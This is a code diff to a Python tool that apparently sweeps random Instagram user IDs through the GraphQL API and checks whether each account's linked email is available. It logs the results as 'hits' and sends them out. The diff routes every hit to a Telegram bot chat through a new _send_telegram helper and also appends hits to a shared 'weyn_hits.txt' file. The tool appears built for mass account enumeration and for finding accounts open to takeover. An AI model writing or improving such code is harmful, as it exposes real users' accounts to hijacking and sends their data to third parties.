@@ -57,6 +57,63 @@ def gdate(user_id):
     except Exception:
         return 2019
 
+# ── Unified hits file ──
+HITS_FILE       = "weyn_hits.txt"
+_hits_file_lock = Lock()
+
+def _write_session_separator(method_num):
+    ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+    sep = (
+        "\n" +
+        "═" * 54 + "\n" +
+        f"  SESSION — METHOD {method_num}  |  {ts}\n" +
+        "═" * 54 + "\n\n"
+    )
+    with _hits_file_lock:
+        with open(HITS_FILE, 'a', encoding='utf-8') as f:
+            f.write(sep)
+
+def _save_hit_to_file(output):
+    with _hits_file_lock:
+        with open(HITS_FILE, 'a', encoding='utf-8') as f:
+            f.write(output + "\n\n")
+
+# ── Global session registry (used by Stop to kill in-flight requests) ──
+_active_sessions      = []
+_active_sessions_lock = Lock()
+
+def _register_session(s):
+    with _active_sessions_lock:
+        _active_sessions.append(s)
+    return s
+
+def close_all_sessions():
+    with _active_sessions_lock:
+        for s in _active_sessions:
+            try: s.close()
+            except Exception: pass
+        _active_sessions.clear()
+
+def _send_telegram(token, chat_id, text):
+    """Send a Telegram message. Stores the last result in _web_state for UI visibility."""
+    try:
+        resp = requests.post(
+            f"https://api.telegram.org/bot{token}/sendMessage",
+            json={"chat_id": chat_id, "text": text},
+            timeout=10
+        )
+        body = resp.json()
+        if body.get('ok'):
+            _web_state['tg_status'] = 'ok'
+            _web_state['tg_error']  = ''
+        else:
+            err = body.get('description', 'Unknown Telegram error')
+            _web_state['tg_status'] = 'error'
+            _web_state['tg_error']  = err
+    except Exception as e:
+        _web_state['tg_status'] = 'error'
+        _web_state['tg_error']  = str(e)
+
 def get_year_range(year_choice):
     if year_choice is None:
         return 1, 6000000000
@@ -193,6 +250,7 @@ _web_state = {
     'hits': 0, 'good': 0, 'bad_insta': 0, 'bad_email': 0,
     'taken': 0, 'limit': 0, 'total': 0, 'verified': 0,
     'recent_hits': [],
+    'tg_status': '', 'tg_error': '',
 }
 _web_lock = Lock()
 _m1_info  = {}
@@ -877,21 +935,12 @@ def _m1_save_hit(username, user, token, chat_id):
             country    = country,
         )
 
-        with open(_M1_CONFIG["output_file"], 'a', encoding='utf-8') as f:
-            f.write(output + "\n\n")
-
         with _m1_found_lock:
             if email_str not in _m1_found_emails:
                 _m1_found_emails.append(email_str)
 
-        try:
-            requests.post(
-                f"https://api.telegram.org/bot{token}/sendMessage",
-                json={"chat_id": chat_id, "text": output},
-                timeout=15
-            )
-        except Exception:
-            pass
+        _send_telegram(token, chat_id, output)
+        _save_hit_to_file(output)
 
 def _m1_cgmail(email, token, chat_id, user, loc_session):
     global _m1_bad_email, _m1_taken
@@ -994,7 +1043,7 @@ def _m1_stats():
         time.sleep(0.3)
 
 def _m1_sinsta(min_id, max_id, token, chat_id, min_followers=0, stop_event=None):
-    loc_session = requests.Session()
+    loc_session = _register_session(requests.Session())
     while not (stop_event and stop_event.is_set()):
         try:
             user_id    = random.randrange(min_id, max_id)
@@ -1020,7 +1069,7 @@ def _m1_sinsta(min_id, max_id, token, chat_id, min_followers=0, stop_event=None)
                 'server_timestamps': 'true',
                 'doc_id': '7717269488336001',
             }
-            resp = loc_session.post(_M1_CONFIG["insta_graphql"], headers=headers, data=data)
+            resp = loc_session.post(_M1_CONFIG["insta_graphql"], headers=headers, data=data, timeout=5)
             if resp.status_code == 200:
                 user = resp.json().get('data', {}).get('user')
                 if user and user.get('username'):
@@ -1263,11 +1312,8 @@ def run_method2(year_choice, min_followers=0):
                 join_date = year_lbl,
                 country   = "-",
             )
-            try:
-                requests.post(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={tg_id}&text={urllib.parse.quote(output)}", timeout=20)
-            except Exception:
-                with open('weyn_hits_m2.txt', 'a') as af:
-                    af.write(output + '\n')
+            _send_telegram(token, tg_id, output)
+            _save_hit_to_file(output)
         else:
             taken_m2 += 1
 
@@ -1559,11 +1605,8 @@ def run_method3(year_choice, min_followers=0):
                 join_date = year_lbl,
                 country   = "-",
             )
-            try:
-                requests.post(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={tg_id}&text={urllib.parse.quote(output)}", timeout=20)
-            except Exception:
-                with open('weyn_hits_m3.txt', 'a') as af:
-                    af.write(output + '\n')
+            _send_telegram(token, tg_id, output)
+            _save_hit_to_file(output)
         else:
             taken_m3 += 1
 
@@ -1849,11 +1892,8 @@ def run_method4(year_choice, min_followers=0):
                     join_date = year_lbl,
                     country   = "-",
                 )
-                try:
-                    requests.post(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={tg_id}&text={urllib.parse.quote(output)}", timeout=20)
-                except Exception:
-                    with open('weyn_hits_m4.txt', 'a') as af:
-                        af.write(output + '\n')
+                _send_telegram(token, tg_id, output)
+                _save_hit_to_file(output)
             else:
                 taken_m4 += 1
         except Exception:
@@ -1987,6 +2027,7 @@ def run_method1_web(token, chat_id, year_choice, min_followers, stop_event):
     _m1_hits = _m1_bad_insta = _m1_bad_email = _m1_good_insta = 0
     _m1_total = _m1_taken = _m1_limit = 0
     _m1_found_emails = []
+    _write_session_separator(1)
     _web_state.update({'running': True, 'method': '1', 'hits': 0, 'good': 0,
                        'bad_insta': 0, 'bad_email': 0, 'taken': 0, 'limit': 0,
                        'total': 0, 'verified': 0, 'recent_hits': []})
@@ -2014,12 +2055,12 @@ def _run_method_generic_web(method_num, token, chat_id, year_choice, min_followe
     counters     = {'hits': 0, 'good': 0, 'taken': 0, 'bad': 0, 'limit': 0}
     info_m       = {}
     recent_hits  = []
-    session_ig   = requests.session()
-    session_gg   = requests.session()
+    session_ig   = _register_session(requests.session())
+    session_gg   = _register_session(requests.session())
     hit_count    = [0]
     min_id, max_id = get_year_range(year_choice)
     tg_id        = chat_id
-    hit_file     = f'weyn_hits_m{method_num}.txt'
+    _write_session_separator(method_num)
     _web_state.update({'running': True, 'method': str(method_num),
                        'hits': 0, 'good': 0, 'taken': 0, 'bad_insta': 0,
                        'limit': 0, 'verified': 0, 'recent_hits': []})
@@ -2074,11 +2115,8 @@ def _run_method_generic_web(method_num, token, chat_id, year_choice, min_followe
                     year_label=year_lbl, reset_text="-",
                     join_date=year_lbl, country="-",
                 )
-                try:
-                    requests.post(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={tg_id}&text={urllib.parse.quote(output)}", timeout=20)
-                except Exception:
-                    with open(hit_file, 'a') as af:
-                        af.write(output + '\n')
+                _send_telegram(token, tg_id, output)
+                _save_hit_to_file(output)
             else:
                 counters['taken'] += 1; _sync()
         except Exception:
@@ -2236,11 +2274,12 @@ def run_method4_web(token, chat_id, year_choice, min_followers, stop_event):
     counters     = {'hits': 0, 'verified': 0, 'bad': 0, 'taken': 0, 'limit': 0}
     info_m4      = {}
     recent_hits  = []
-    session_m4   = requests.session()
-    _session_m4  = requests.session()
+    session_m4   = _register_session(requests.session())
+    _session_m4  = _register_session(requests.session())
     hit_count    = [0]
     tg_id        = chat_id
     min_id, max_id = get_year_range(year_choice)
+    _write_session_separator(4)
     _web_state.update({'running': True, 'method': '4', 'hits': 0, 'good': 0,
                        'taken': 0, 'bad_insta': 0, 'limit': 0, 'verified': 0,
                        'recent_hits': []})
@@ -2303,11 +2342,8 @@ def run_method4_web(token, chat_id, year_choice, min_followers, stop_event):
                     year_label=year_lbl, reset_text="-",
                     join_date=year_lbl, country="-",
                 )
-                try:
-                    requests.post(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={tg_id}&text={urllib.parse.quote(output)}", timeout=20)
-                except Exception:
-                    with open('weyn_hits_m4.txt', 'a') as af:
-                        af.write(output + '\n')
+                _send_telegram(token, tg_id, output)
+                _save_hit_to_file(output)
             else:
                 counters['taken'] += 1; _sync()
         except Exception:
